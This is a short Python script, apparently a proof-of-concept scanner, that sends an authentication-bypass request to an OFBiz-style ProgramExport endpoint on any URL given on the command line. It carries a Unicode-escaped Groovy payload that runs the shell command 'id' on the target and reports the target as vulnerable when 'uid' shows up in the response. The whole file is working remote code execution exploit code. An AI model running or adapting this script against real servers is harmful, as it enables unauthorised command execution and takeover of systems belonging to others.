import requests
import argparse
from faker import Faker

fake = Faker()
# 创建命令行参数解析器
parser = argparse.ArgumentParser(description='发送带有指定URL的POST请求。存在问题的路径为/webtools/control/forgotPassword/%2e/%2e/ProgramExport',formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('-u', '--url', type=str, help='输入目标url发送post请求')

args = parser.parse_args()

if args.url:
    if args.url.endswith('/'):
        url = args.url[:-1] + "/webtools/control/forgotPassword/%2e/%2e/ProgramExport"  # 移除末尾的斜杠
    else:
        url = args.url + "/webtools/control/forgotPassword/%2e/%2e/ProgramExport"
else:
    print("Please provide a valid URL using -u or --url argument.")
    exit()

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
    'Connection': 'close',
    'Content-Type': 'application/x-www-form-urlencoded'
}

params = {
    "groovyProgram": "\u0074\u0068\u0072\u006f\u0077\u0020\u006e\u0065\u0077\u0020\u0045\u0078\u0063\u0065\u0070\u0074\u0069\u006f\u006e\u0028\u0027\u0069\u0064\u0027\u002e\u0065\u0078\u0065\u0063\u0075\u0074\u0065\u0028\u0029\u002e\u0074\u0065\u0078\u0074\u0029\u003b"
}

# 修改为 POST 请求
response = requests.post(url, headers=headers, data=params)
if 'uid' in response.headers:
    print("目标url："+ url + '\n' +"存在漏洞\n")
    print(response.headers)
else:
    print("目标url："+ url + '\n' +"不存在漏洞")